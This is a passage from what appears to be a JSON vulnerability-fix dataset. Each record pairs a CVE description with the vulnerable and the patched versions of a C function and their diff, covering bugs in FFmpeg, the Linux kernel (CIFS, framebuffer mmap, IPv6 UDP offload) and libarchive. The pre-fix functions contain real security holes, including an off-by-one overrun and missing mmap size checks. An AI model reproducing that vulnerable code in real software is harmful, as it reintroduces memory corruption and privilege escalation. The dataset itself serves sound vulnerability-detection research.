        "func": "static void format_line(void *ptr, int level, const char *fmt, va_list vl,\n                        char part[3][LINE_SZ], int part_size, int *print_prefix, int type[2])\n{\n    AVClass* avc = ptr ? *(AVClass **) ptr : NULL;\n    part[0][0] = part[1][0] = part[2][0] = 0;\n    if(type) type[0] = type[1] = AV_CLASS_CATEGORY_NA + 16;\n    if (*print_prefix && avc) {\n        if (avc->parent_log_context_offset) {\n            AVClass** parent = *(AVClass ***) (((uint8_t *) ptr) +\n                                   avc->parent_log_context_offset);\n            if (parent && *parent) {\n                snprintf(part[0], part_size, \"[%s @ %p] \",\n                         (*parent)->item_name(parent), parent);\n                if(type) type[0] = get_category(parent);\n            }\n        }\n        snprintf(part[1], part_size, \"[%s @ %p] \",\n                 avc->item_name(ptr), ptr);\n        if(type) type[1] = get_category(ptr);\n    }\n\n    vsnprintf(part[2], part_size, fmt, vl);\n\n    *print_prefix = strlen(part[2]) && part[2][strlen(part[2]) - 1] == '\\n';\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -11,7 +11,7 @@\n             if (parent && *parent) {\n                 snprintf(part[0], part_size, \"[%s @ %p] \",\n                          (*parent)->item_name(parent), parent);\n-                if(type) type[0] = get_category(((uint8_t *) ptr) + avc->parent_log_context_offset);\n+                if(type) type[0] = get_category(parent);\n             }\n         }\n         snprintf(part[1], part_size, \"[%s @ %p] \",",
        "diff_line_info": {
            "deleted_lines": [
                "                if(type) type[0] = get_category(((uint8_t *) ptr) + avc->parent_log_context_offset);"
            ],
            "added_lines": [
                "                if(type) type[0] = get_category(parent);"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-4247",
        "func_name": "torvalds/linux/build_unc_path_to_root",
        "description": "Off-by-one error in the build_unc_path_to_root function in fs/cifs/connect.c in the Linux kernel before 3.9.6 allows remote attackers to cause a denial of service (memory corruption and system crash) via a DFS share mount operation that triggers use of an unexpected DFS referral name length.",
        "git_url": "https://github.com/torvalds/linux/commit/1fc29bacedeabb278080e31bb9c1ecb49f143c3b",
        "commit_title": "cifs: fix off-by-one bug in build_unc_path_to_root",
        "commit_text": " commit 839db3d10a (cifs: fix up handling of prefixpath= option) changed the code such that the vol->prepath no longer contained a leading delimiter and then fixed up the places that accessed that field to account for that change.  One spot in build_unc_path_to_root was missed however. When doing the pointer addition on pos, that patch failed to account for the fact that we had already incremented \"pos\" by one when adding the length of the prepath. This caused a buffer overrun by one byte.  This patch fixes the problem by correcting the handling of \"pos\".  Cc: <stable@vger.kernel.org> # v3.8+",
        "func_before": "static char *\nbuild_unc_path_to_root(const struct smb_vol *vol,\n\t\tconst struct cifs_sb_info *cifs_sb)\n{\n\tchar *full_path, *pos;\n\tunsigned int pplen = vol->prepath ? strlen(vol->prepath) + 1 : 0;\n\tunsigned int unc_len = strnlen(vol->UNC, MAX_TREE_SIZE + 1);\n\n\tfull_path = kmalloc(unc_len + pplen + 1, GFP_KERNEL);\n\tif (full_path == NULL)\n\t\treturn ERR_PTR(-ENOMEM);\n\n\tstrncpy(full_path, vol->UNC, unc_len);\n\tpos = full_path + unc_len;\n\n\tif (pplen) {\n\t\t*pos++ = CIFS_DIR_SEP(cifs_sb);\n\t\tstrncpy(pos, vol->prepath, pplen);\n\t\tpos += pplen;\n\t}\n\n\t*pos = '\\0'; /* add trailing null */\n\tconvert_delimiter(full_path, CIFS_DIR_SEP(cifs_sb));\n\tcifs_dbg(FYI, \"%s: full_path=%s\\n\", __func__, full_path);\n\treturn full_path;\n}",
        "func": "static char *\nbuild_unc_path_to_root(const struct smb_vol *vol,\n\t\tconst struct cifs_sb_info *cifs_sb)\n{\n\tchar *full_path, *pos;\n\tunsigned int pplen = vol->prepath ? strlen(vol->prepath) + 1 : 0;\n\tunsigned int unc_len = strnlen(vol->UNC, MAX_TREE_SIZE + 1);\n\n\tfull_path = kmalloc(unc_len + pplen + 1, GFP_KERNEL);\n\tif (full_path == NULL)\n\t\treturn ERR_PTR(-ENOMEM);\n\n\tstrncpy(full_path, vol->UNC, unc_len);\n\tpos = full_path + unc_len;\n\n\tif (pplen) {\n\t\t*pos = CIFS_DIR_SEP(cifs_sb);\n\t\tstrncpy(pos + 1, vol->prepath, pplen);\n\t\tpos += pplen;\n\t}\n\n\t*pos = '\\0'; /* add trailing null */\n\tconvert_delimiter(full_path, CIFS_DIR_SEP(cifs_sb));\n\tcifs_dbg(FYI, \"%s: full_path=%s\\n\", __func__, full_path);\n\treturn full_path;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -14,8 +14,8 @@\n \tpos = full_path + unc_len;\n \n \tif (pplen) {\n-\t\t*pos++ = CIFS_DIR_SEP(cifs_sb);\n-\t\tstrncpy(pos, vol->prepath, pplen);\n+\t\t*pos = CIFS_DIR_SEP(cifs_sb);\n+\t\tstrncpy(pos + 1, vol->prepath, pplen);\n \t\tpos += pplen;\n \t}\n ",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t*pos++ = CIFS_DIR_SEP(cifs_sb);",
                "\t\tstrncpy(pos, vol->prepath, pplen);"
            ],
            "added_lines": [
                "\t\t*pos = CIFS_DIR_SEP(cifs_sb);",
                "\t\tstrncpy(pos + 1, vol->prepath, pplen);"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-0211",
        "func_name": "libarchive/_archive_write_data",
        "description": "Integer signedness error in the archive_write_zip_data function in archive_write_set_format_zip.c in libarchive 3.1.2 and earlier, when running on 64-bit machines, allows context-dependent attackers to cause a denial of service (crash) via unspecified vectors, which triggers an improper conversion between unsigned and signed types, leading to a buffer overflow.",
        "git_url": "https://github.com/libarchive/libarchive/commit/22531545514043e04633e1c015c7540b9de9dbe4",
        "commit_title": "Limit write requests to at most INT_MAX.",
        "commit_text": "This prevents a certain common programming error (passing -1 to write) from leading to other problems deeper in the library.",
        "func_before": "static ssize_t\n_archive_write_data(struct archive *_a, const void *buff, size_t s)\n{\n\tstruct archive_write *a = (struct archive_write *)_a;\n\tarchive_check_magic(&a->archive, ARCHIVE_WRITE_MAGIC,\n\t    ARCHIVE_STATE_DATA, \"archive_write_data\");\n\tarchive_clear_error(&a->archive);\n\treturn ((a->format_write_data)(a, buff, s));\n}",
        "func": "static ssize_t\n_archive_write_data(struct archive *_a, const void *buff, size_t s)\n{\n\tstruct archive_write *a = (struct archive_write *)_a;\n\tconst size_t max_write = INT_MAX;\n\n\tarchive_check_magic(&a->archive, ARCHIVE_WRITE_MAGIC,\n\t    ARCHIVE_STATE_DATA, \"archive_write_data\");\n\t/* In particular, this catches attempts to pass negative values. */\n\tif (s > max_write)\n\t\ts = max_write;\n\tarchive_clear_error(&a->archive);\n\treturn ((a->format_write_data)(a, buff, s));\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -2,8 +2,13 @@\n _archive_write_data(struct archive *_a, const void *buff, size_t s)\n {\n \tstruct archive_write *a = (struct archive_write *)_a;\n+\tconst size_t max_write = INT_MAX;\n+\n \tarchive_check_magic(&a->archive, ARCHIVE_WRITE_MAGIC,\n \t    ARCHIVE_STATE_DATA, \"archive_write_data\");\n+\t/* In particular, this catches attempts to pass negative values. */\n+\tif (s > max_write)\n+\t\ts = max_write;\n \tarchive_clear_error(&a->archive);\n \treturn ((a->format_write_data)(a, buff, s));\n }",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\tconst size_t max_write = INT_MAX;",
                "",
                "\t/* In particular, this catches attempts to pass negative values. */",
                "\tif (s > max_write)",
                "\t\ts = max_write;"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-4511",
        "func_name": "torvalds/linux/au1100fb_fb_mmap",
        "description": "Multiple integer overflows in Alchemy LCD frame-buffer drivers in the Linux kernel before 3.12 allow local users to create a read-write memory mapping for the entirety of kernel memory, and consequently gain privileges, via crafted mmap operations, related to the (1) au1100fb_fb_mmap function in drivers/video/au1100fb.c and the (2) au1200fb_fb_mmap function in drivers/video/au1200fb.c.",
        "git_url": "https://github.com/torvalds/linux/commit/7314e613d5ff9f0934f7a0f74ed7973b903315d1",
        "commit_title": "Fix a few incorrectly checked [io_]remap_pfn_range() calls",
        "commit_text": " Nico Golde reports a few straggling uses of [io_]remap_pfn_range() that really should use the vm_iomap_memory() helper.  This trivially converts two of them to the helper, and comments about why the third one really needs to continue to use remap_pfn_range(), and adds the missing size check.  Cc: stable@kernel.org",
        "func_before": "int au1100fb_fb_mmap(struct fb_info *fbi, struct vm_area_struct *vma)\n{\n\tstruct au1100fb_device *fbdev;\n\tunsigned int len;\n\tunsigned long start=0, off;\n\n\tfbdev = to_au1100fb_device(fbi);\n\n\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {\n\t\treturn -EINVAL;\n\t}\n\n\tstart = fbdev->fb_phys & PAGE_MASK;\n\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);\n\n\toff = vma->vm_pgoff << PAGE_SHIFT;\n\n\tif ((vma->vm_end - vma->vm_start + off) > len) {\n\t\treturn -EINVAL;\n\t}\n\n\toff += start;\n\tvma->vm_pgoff = off >> PAGE_SHIFT;\n\n\tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n\tpgprot_val(vma->vm_page_prot) |= (6 << 9); //CCA=6\n\n\tif (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n\t\t\t\tvma->vm_end - vma->vm_start,\n\t\t\t\tvma->vm_page_prot)) {\n\t\treturn -EAGAIN;\n\t}\n\n\treturn 0;\n}",
        "func": "int au1100fb_fb_mmap(struct fb_info *fbi, struct vm_area_struct *vma)\n{\n\tstruct au1100fb_device *fbdev;\n\n\tfbdev = to_au1100fb_device(fbi);\n\n\tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n\tpgprot_val(vma->vm_page_prot) |= (6 << 9); //CCA=6\n\n\treturn vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,35 +1,11 @@\n int au1100fb_fb_mmap(struct fb_info *fbi, struct vm_area_struct *vma)\n {\n \tstruct au1100fb_device *fbdev;\n-\tunsigned int len;\n-\tunsigned long start=0, off;\n \n \tfbdev = to_au1100fb_device(fbi);\n-\n-\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {\n-\t\treturn -EINVAL;\n-\t}\n-\n-\tstart = fbdev->fb_phys & PAGE_MASK;\n-\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);\n-\n-\toff = vma->vm_pgoff << PAGE_SHIFT;\n-\n-\tif ((vma->vm_end - vma->vm_start + off) > len) {\n-\t\treturn -EINVAL;\n-\t}\n-\n-\toff += start;\n-\tvma->vm_pgoff = off >> PAGE_SHIFT;\n \n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \tpgprot_val(vma->vm_page_prot) |= (6 << 9); //CCA=6\n \n-\tif (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n-\t\t\t\tvma->vm_end - vma->vm_start,\n-\t\t\t\tvma->vm_page_prot)) {\n-\t\treturn -EAGAIN;\n-\t}\n-\n-\treturn 0;\n+\treturn vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tunsigned int len;",
                "\tunsigned long start=0, off;",
                "",
                "\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {",
                "\t\treturn -EINVAL;",
                "\t}",
                "",
                "\tstart = fbdev->fb_phys & PAGE_MASK;",
                "\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);",
                "",
                "\toff = vma->vm_pgoff << PAGE_SHIFT;",
                "",
                "\tif ((vma->vm_end - vma->vm_start + off) > len) {",
                "\t\treturn -EINVAL;",
                "\t}",
                "",
                "\toff += start;",
                "\tvma->vm_pgoff = off >> PAGE_SHIFT;",
                "\tif (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,",
                "\t\t\t\tvma->vm_end - vma->vm_start,",
                "\t\t\t\tvma->vm_page_prot)) {",
                "\t\treturn -EAGAIN;",
                "\t}",
                "",
                "\treturn 0;"
            ],
            "added_lines": [
                "\treturn vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-4511",
        "func_name": "torvalds/linux/uio_mmap_physical",
        "description": "Multiple integer overflows in Alchemy LCD frame-buffer drivers in the Linux kernel before 3.12 allow local users to create a read-write memory mapping for the entirety of kernel memory, and consequently gain privileges, via crafted mmap operations, related to the (1) au1100fb_fb_mmap function in drivers/video/au1100fb.c and the (2) au1200fb_fb_mmap function in drivers/video/au1200fb.c.",
        "git_url": "https://github.com/torvalds/linux/commit/7314e613d5ff9f0934f7a0f74ed7973b903315d1",
        "commit_title": "Fix a few incorrectly checked [io_]remap_pfn_range() calls",
        "commit_text": " Nico Golde reports a few straggling uses of [io_]remap_pfn_range() that really should use the vm_iomap_memory() helper.  This trivially converts two of them to the helper, and comments about why the third one really needs to continue to use remap_pfn_range(), and adds the missing size check.  Cc: stable@kernel.org",
        "func_before": "static int uio_mmap_physical(struct vm_area_struct *vma)\n{\n\tstruct uio_device *idev = vma->vm_private_data;\n\tint mi = uio_find_mem_index(vma);\n\tif (mi < 0)\n\t\treturn -EINVAL;\n\n\tvma->vm_ops = &uio_physical_vm_ops;\n\n\tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n\n\treturn remap_pfn_range(vma,\n\t\t\t       vma->vm_start,\n\t\t\t       idev->info->mem[mi].addr >> PAGE_SHIFT,\n\t\t\t       vma->vm_end - vma->vm_start,\n\t\t\t       vma->vm_page_prot);\n}",
        "func": "static int uio_mmap_physical(struct vm_area_struct *vma)\n{\n\tstruct uio_device *idev = vma->vm_private_data;\n\tint mi = uio_find_mem_index(vma);\n\tstruct uio_mem *mem;\n\tif (mi < 0)\n\t\treturn -EINVAL;\n\tmem = idev->info->mem + mi;\n\n\tif (vma->vm_end - vma->vm_start > mem->size)\n\t\treturn -EINVAL;\n\n\tvma->vm_ops = &uio_physical_vm_ops;\n\tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n\n\t/*\n\t * We cannot use the vm_iomap_memory() helper here,\n\t * because vma->vm_pgoff is the map index we looked\n\t * up above in uio_find_mem_index(), rather than an\n\t * actual page offset into the mmap.\n\t *\n\t * So we just do the physical mmap without a page\n\t * offset.\n\t */\n\treturn remap_pfn_range(vma,\n\t\t\t       vma->vm_start,\n\t\t\t       mem->addr >> PAGE_SHIFT,\n\t\t\t       vma->vm_end - vma->vm_start,\n\t\t\t       vma->vm_page_prot);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -2,16 +2,29 @@\n {\n \tstruct uio_device *idev = vma->vm_private_data;\n \tint mi = uio_find_mem_index(vma);\n+\tstruct uio_mem *mem;\n \tif (mi < 0)\n+\t\treturn -EINVAL;\n+\tmem = idev->info->mem + mi;\n+\n+\tif (vma->vm_end - vma->vm_start > mem->size)\n \t\treturn -EINVAL;\n \n \tvma->vm_ops = &uio_physical_vm_ops;\n-\n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \n+\t/*\n+\t * We cannot use the vm_iomap_memory() helper here,\n+\t * because vma->vm_pgoff is the map index we looked\n+\t * up above in uio_find_mem_index(), rather than an\n+\t * actual page offset into the mmap.\n+\t *\n+\t * So we just do the physical mmap without a page\n+\t * offset.\n+\t */\n \treturn remap_pfn_range(vma,\n \t\t\t       vma->vm_start,\n-\t\t\t       idev->info->mem[mi].addr >> PAGE_SHIFT,\n+\t\t\t       mem->addr >> PAGE_SHIFT,\n \t\t\t       vma->vm_end - vma->vm_start,\n \t\t\t       vma->vm_page_prot);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "",
                "\t\t\t       idev->info->mem[mi].addr >> PAGE_SHIFT,"
            ],
            "added_lines": [
                "\tstruct uio_mem *mem;",
                "\t\treturn -EINVAL;",
                "\tmem = idev->info->mem + mi;",
                "",
                "\tif (vma->vm_end - vma->vm_start > mem->size)",
                "\t/*",
                "\t * We cannot use the vm_iomap_memory() helper here,",
                "\t * because vma->vm_pgoff is the map index we looked",
                "\t * up above in uio_find_mem_index(), rather than an",
                "\t * actual page offset into the mmap.",
                "\t *",
                "\t * So we just do the physical mmap without a page",
                "\t * offset.",
                "\t */",
                "\t\t\t       mem->addr >> PAGE_SHIFT,"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-4511",
        "func_name": "torvalds/linux/au1200fb_fb_mmap",
        "description": "Multiple integer overflows in Alchemy LCD frame-buffer drivers in the Linux kernel before 3.12 allow local users to create a read-write memory mapping for the entirety of kernel memory, and consequently gain privileges, via crafted mmap operations, related to the (1) au1100fb_fb_mmap function in drivers/video/au1100fb.c and the (2) au1200fb_fb_mmap function in drivers/video/au1200fb.c.",
        "git_url": "https://github.com/torvalds/linux/commit/7314e613d5ff9f0934f7a0f74ed7973b903315d1",
        "commit_title": "Fix a few incorrectly checked [io_]remap_pfn_range() calls",
        "commit_text": " Nico Golde reports a few straggling uses of [io_]remap_pfn_range() that really should use the vm_iomap_memory() helper.  This trivially converts two of them to the helper, and comments about why the third one really needs to continue to use remap_pfn_range(), and adds the missing size check.  Cc: stable@kernel.org",
        "func_before": "static int au1200fb_fb_mmap(struct fb_info *info, struct vm_area_struct *vma)\n\n{\n\tunsigned int len;\n\tunsigned long start=0, off;\n\tstruct au1200fb_device *fbdev = info->par;\n\n\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {\n\t\treturn -EINVAL;\n\t}\n\n\tstart = fbdev->fb_phys & PAGE_MASK;\n\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);\n\n\toff = vma->vm_pgoff << PAGE_SHIFT;\n\n\tif ((vma->vm_end - vma->vm_start + off) > len) {\n\t\treturn -EINVAL;\n\t}\n\n\toff += start;\n\tvma->vm_pgoff = off >> PAGE_SHIFT;\n\n\tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n\tpgprot_val(vma->vm_page_prot) |= _CACHE_MASK; /* CCA=7 */\n\n\treturn io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n\t\t\t\t  vma->vm_end - vma->vm_start,\n\t\t\t\t  vma->vm_page_prot);\n}",
        "func": "static int au1200fb_fb_mmap(struct fb_info *info, struct vm_area_struct *vma)\n{\n\tstruct au1200fb_device *fbdev = info->par;\n\n\tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n\tpgprot_val(vma->vm_page_prot) |= _CACHE_MASK; /* CCA=7 */\n\n\treturn vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,30 +1,9 @@\n static int au1200fb_fb_mmap(struct fb_info *info, struct vm_area_struct *vma)\n-\n {\n-\tunsigned int len;\n-\tunsigned long start=0, off;\n \tstruct au1200fb_device *fbdev = info->par;\n-\n-\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {\n-\t\treturn -EINVAL;\n-\t}\n-\n-\tstart = fbdev->fb_phys & PAGE_MASK;\n-\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);\n-\n-\toff = vma->vm_pgoff << PAGE_SHIFT;\n-\n-\tif ((vma->vm_end - vma->vm_start + off) > len) {\n-\t\treturn -EINVAL;\n-\t}\n-\n-\toff += start;\n-\tvma->vm_pgoff = off >> PAGE_SHIFT;\n \n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \tpgprot_val(vma->vm_page_prot) |= _CACHE_MASK; /* CCA=7 */\n \n-\treturn io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n-\t\t\t\t  vma->vm_end - vma->vm_start,\n-\t\t\t\t  vma->vm_page_prot);\n+\treturn vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "",
                "\tunsigned int len;",
                "\tunsigned long start=0, off;",
                "",
                "\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {",
                "\t\treturn -EINVAL;",
                "\t}",
                "",
                "\tstart = fbdev->fb_phys & PAGE_MASK;",
                "\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);",
                "",
                "\toff = vma->vm_pgoff << PAGE_SHIFT;",
                "",
                "\tif ((vma->vm_end - vma->vm_start + off) > len) {",
                "\t\treturn -EINVAL;",
                "\t}",
                "",
                "\toff += start;",
                "\tvma->vm_pgoff = off >> PAGE_SHIFT;",
                "\treturn io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,",
                "\t\t\t\t  vma->vm_end - vma->vm_start,",
                "\t\t\t\t  vma->vm_page_prot);"
            ],
            "added_lines": [
                "\treturn vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-4563",
        "func_name": "torvalds/linux/udp6_ufo_fragment",
        "description": "The udp6_ufo_fragment function in net/ipv6/udp_offload.c in the Linux kernel through 3.12, when UDP Fragmentation Offload (UFO) is enabled, does not properly perform a certain size comparison before inserting a fragment header, which allows remote attackers to cause a denial of service (panic) via a large IPv6 UDP packet, as demonstrated by use of the Token Bucket Filter (TBF) queueing discipline.",
        "git_url": "https://github.com/torvalds/linux/commit/0e033e04c2678dbbe74a46b23fffb7bb918c288e",
        "commit_title": "ipv6: fix headroom calculation in udp6_ufo_fragment",
        "commit_text": " Commit 1e2bd517c108816220f262d7954b697af03b5f9c (\"udp6: Fix udp fragmentation for tunnel traffic.\") changed the calculation if there is enough space to include a fragment header in the skb from a skb->mac_header dervived one to skb_headroom. Because we already peeled off the skb to transport_header this is wrong. Change this back to check if we have enough room before the mac_header.  This fixes a panic Saran Neti reported. He used the tbf scheduler which skb_gso_segments the skb. The offsets get negative and we panic in memcpy because the skb was erroneously not expanded at the head.  Cc: Pravin B Shelar <pshelar@nicira.com>",
        "func_before": "static struct sk_buff *udp6_ufo_fragment(struct sk_buff *skb,\n\t\t\t\t\t netdev_features_t features)\n{\n\tstruct sk_buff *segs = ERR_PTR(-EINVAL);\n\tunsigned int mss;\n\tunsigned int unfrag_ip6hlen, unfrag_len;\n\tstruct frag_hdr *fptr;\n\tu8 *packet_start, *prevhdr;\n\tu8 nexthdr;\n\tu8 frag_hdr_sz = sizeof(struct frag_hdr);\n\tint offset;\n\t__wsum csum;\n\tint tnl_hlen;\n\n\tmss = skb_shinfo(skb)->gso_size;\n\tif (unlikely(skb->len <= mss))\n\t\tgoto out;\n\n\tif (skb_gso_ok(skb, features | NETIF_F_GSO_ROBUST)) {\n\t\t/* Packet is from an untrusted source, reset gso_segs. */\n\t\tint type = skb_shinfo(skb)->gso_type;\n\n\t\tif (unlikely(type & ~(SKB_GSO_UDP |\n\t\t\t\t      SKB_GSO_DODGY |\n\t\t\t\t      SKB_GSO_UDP_TUNNEL |\n\t\t\t\t      SKB_GSO_GRE |\n\t\t\t\t      SKB_GSO_IPIP |\n\t\t\t\t      SKB_GSO_SIT |\n\t\t\t\t      SKB_GSO_MPLS) ||\n\t\t\t     !(type & (SKB_GSO_UDP))))\n\t\t\tgoto out;\n\n\t\tskb_shinfo(skb)->gso_segs = DIV_ROUND_UP(skb->len, mss);\n\n\t\tsegs = NULL;\n\t\tgoto out;\n\t}\n\n\tif (skb->encapsulation && skb_shinfo(skb)->gso_type & SKB_GSO_UDP_TUNNEL)\n\t\tsegs = skb_udp_tunnel_segment(skb, features);\n\telse {\n\t\t/* Do software UFO. Complete and fill in the UDP checksum as HW cannot\n\t\t * do checksum of UDP packets sent as multiple IP fragments.\n\t\t */\n\t\toffset = skb_checksum_start_offset(skb);\n\t\tcsum = skb_checksum(skb, offset, skb->len - offset, 0);\n\t\toffset += skb->csum_offset;\n\t\t*(__sum16 *)(skb->data + offset) = csum_fold(csum);\n\t\tskb->ip_summed = CHECKSUM_NONE;\n\n\t\t/* Check if there is enough headroom to insert fragment header. */\n\t\ttnl_hlen = skb_tnl_header_len(skb);\n\t\tif (skb_headroom(skb) < (tnl_hlen + frag_hdr_sz)) {\n\t\t\tif (gso_pskb_expand_head(skb, tnl_hlen + frag_hdr_sz))\n\t\t\t\tgoto out;\n\t\t}\n\n\t\t/* Find the unfragmentable header and shift it left by frag_hdr_sz\n\t\t * bytes to insert fragment header.\n\t\t */\n\t\tunfrag_ip6hlen = ip6_find_1stfragopt(skb, &prevhdr);\n\t\tnexthdr = *prevhdr;\n\t\t*prevhdr = NEXTHDR_FRAGMENT;\n\t\tunfrag_len = (skb_network_header(skb) - skb_mac_header(skb)) +\n\t\t\t     unfrag_ip6hlen + tnl_hlen;\n\t\tpacket_start = (u8 *) skb->head + SKB_GSO_CB(skb)->mac_offset;\n\t\tmemmove(packet_start-frag_hdr_sz, packet_start, unfrag_len);\n\n\t\tSKB_GSO_CB(skb)->mac_offset -= frag_hdr_sz;\n\t\tskb->mac_header -= frag_hdr_sz;\n\t\tskb->network_header -= frag_hdr_sz;\n\n\t\tfptr = (struct frag_hdr *)(skb_network_header(skb) + unfrag_ip6hlen);\n\t\tfptr->nexthdr = nexthdr;\n\t\tfptr->reserved = 0;\n\t\tipv6_select_ident(fptr, (struct rt6_info *)skb_dst(skb));\n\n\t\t/* Fragment the skb. ipv6 header and the remaining fields of the\n\t\t * fragment header are updated in ipv6_gso_segment()\n\t\t */\n\t\tsegs = skb_segment(skb, features);\n\t}\n\nout:\n\treturn segs;\n}",
        "func": "static struct sk_buff *udp6_ufo_fragment(struct sk_buff *skb,\n\t\t\t\t\t netdev_features_t features)\n{\n\tstruct sk_buff *segs = ERR_PTR(-EINVAL);\n\tunsigned int mss;\n\tunsigned int unfrag_ip6hlen, unfrag_len;\n\tstruct frag_hdr *fptr;\n\tu8 *packet_start, *prevhdr;\n\tu8 nexthdr;\n\tu8 frag_hdr_sz = sizeof(struct frag_hdr);\n\tint offset;\n\t__wsum csum;\n\tint tnl_hlen;\n\n\tmss = skb_shinfo(skb)->gso_size;\n\tif (unlikely(skb->len <= mss))\n\t\tgoto out;\n\n\tif (skb_gso_ok(skb, features | NETIF_F_GSO_ROBUST)) {\n\t\t/* Packet is from an untrusted source, reset gso_segs. */\n\t\tint type = skb_shinfo(skb)->gso_type;\n\n\t\tif (unlikely(type & ~(SKB_GSO_UDP |\n\t\t\t\t      SKB_GSO_DODGY |\n\t\t\t\t      SKB_GSO_UDP_TUNNEL |\n\t\t\t\t      SKB_GSO_GRE |\n\t\t\t\t      SKB_GSO_IPIP |\n\t\t\t\t      SKB_GSO_SIT |\n\t\t\t\t      SKB_GSO_MPLS) ||\n\t\t\t     !(type & (SKB_GSO_UDP))))\n\t\t\tgoto out;\n\n\t\tskb_shinfo(skb)->gso_segs = DIV_ROUND_UP(skb->len, mss);\n\n\t\tsegs = NULL;\n\t\tgoto out;\n\t}\n\n\tif (skb->encapsulation && skb_shinfo(skb)->gso_type & SKB_GSO_UDP_TUNNEL)\n\t\tsegs = skb_udp_tunnel_segment(skb, features);\n\telse {\n\t\t/* Do software UFO. Complete and fill in the UDP checksum as HW cannot\n\t\t * do checksum of UDP packets sent as multiple IP fragments.\n\t\t */\n\t\toffset = skb_checksum_start_offset(skb);\n\t\tcsum = skb_checksum(skb, offset, skb->len - offset, 0);\n\t\toffset += skb->csum_offset;\n\t\t*(__sum16 *)(skb->data + offset) = csum_fold(csum);\n\t\tskb->ip_summed = CHECKSUM_NONE;\n\n\t\t/* Check if there is enough headroom to insert fragment header. */\n\t\ttnl_hlen = skb_tnl_header_len(skb);\n\t\tif (skb->mac_header < (tnl_hlen + frag_hdr_sz)) {\n\t\t\tif (gso_pskb_expand_head(skb, tnl_hlen + frag_hdr_sz))\n\t\t\t\tgoto out;\n\t\t}\n\n\t\t/* Find the unfragmentable header and shift it left by frag_hdr_sz\n\t\t * bytes to insert fragment header.\n\t\t */\n\t\tunfrag_ip6hlen = ip6_find_1stfragopt(skb, &prevhdr);\n\t\tnexthdr = *prevhdr;\n\t\t*prevhdr = NEXTHDR_FRAGMENT;\n\t\tunfrag_len = (skb_network_header(skb) - skb_mac_header(skb)) +\n\t\t\t     unfrag_ip6hlen + tnl_hlen;\n\t\tpacket_start = (u8 *) skb->head + SKB_GSO_CB(skb)->mac_offset;\n\t\tmemmove(packet_start-frag_hdr_sz, packet_start, unfrag_len);\n\n\t\tSKB_GSO_CB(skb)->mac_offset -= frag_hdr_sz;\n\t\tskb->mac_header -= frag_hdr_sz;\n\t\tskb->network_header -= frag_hdr_sz;\n\n\t\tfptr = (struct frag_hdr *)(skb_network_header(skb) + unfrag_ip6hlen);\n\t\tfptr->nexthdr = nexthdr;\n\t\tfptr->reserved = 0;\n\t\tipv6_select_ident(fptr, (struct rt6_info *)skb_dst(skb));\n\n\t\t/* Fragment the skb. ipv6 header and the remaining fields of the\n\t\t * fragment header are updated in ipv6_gso_segment()\n\t\t */\n\t\tsegs = skb_segment(skb, features);\n\t}\n\nout:\n\treturn segs;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -50,7 +50,7 @@\n \n \t\t/* Check if there is enough headroom to insert fragment header. */\n \t\ttnl_hlen = skb_tnl_header_len(skb);\n-\t\tif (skb_headroom(skb) < (tnl_hlen + frag_hdr_sz)) {\n+\t\tif (skb->mac_header < (tnl_hlen + frag_hdr_sz)) {\n \t\t\tif (gso_pskb_expand_head(skb, tnl_hlen + frag_hdr_sz))\n \t\t\t\tgoto out;\n \t\t}",
        "diff_line_info": {
            "deleted_lines": [
                "\t\tif (skb_headroom(skb) < (tnl_hlen + frag_hdr_sz)) {"
            ],
            "added_lines": [
